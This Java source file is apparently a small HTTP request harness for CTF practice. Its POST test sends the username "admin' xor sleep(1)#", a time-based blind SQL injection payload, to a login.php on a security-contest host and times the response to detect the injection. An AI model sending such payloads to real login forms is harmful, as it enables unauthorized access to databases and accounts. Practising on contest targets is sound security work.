package bsmali4;

import org.apache.http.Header;

public class Main {

	/**
	 * @param args
	 */
	public static void main(String[] args) {
		testPost();

	}

	// get请求
	public void testGet() {
		Bsmali4Get httpGet = new Bsmali4Get(
				"http://www.baidu.com");
		httpGet.doGet();
		System.out.println(httpGet.getResStatus());
		System.out.println(httpGet.getResLen());
		System.out.println(httpGet.getResContent());
		for (Header header : httpGet.getResHeaders()) {
			System.out.println(header.getName() + ":" + header.getValue());
		}
	}

	// post请求
	public static void testPost() {
		long startTime=System.currentTimeMillis();
		Bsmali4Post httpPost = new Bsmali4Post(
				"http://web.sycsec.com:80/a2274e0e500459f7/login.php");
		httpPost.addHeader("Accept-Encoding", "identity");
		httpPost.addData("username", "admin' xor sleep(1)#");
		httpPost.addData("password", "x");
		httpPost.addData("debug", "1");
		//httpPost.setResCode("utf-8");
		// httpPost.addHeader("redirect_to",
		// "http://www.codersec.net/wp-admin/&testcookie=1");
		httpPost.doPost();
		System.out.println(httpPost.getResStatus());
		System.out.println(httpPost.getResLen());
		System.out.println(httpPost.getResContent());
		for (Header header : httpPost.getResHeaders()) {
			System.out.println(header.getName() + ":" + header.getValue());
		}
		long endTime=System.currentTimeMillis();
		System.out.println((endTime - startTime));
	}
}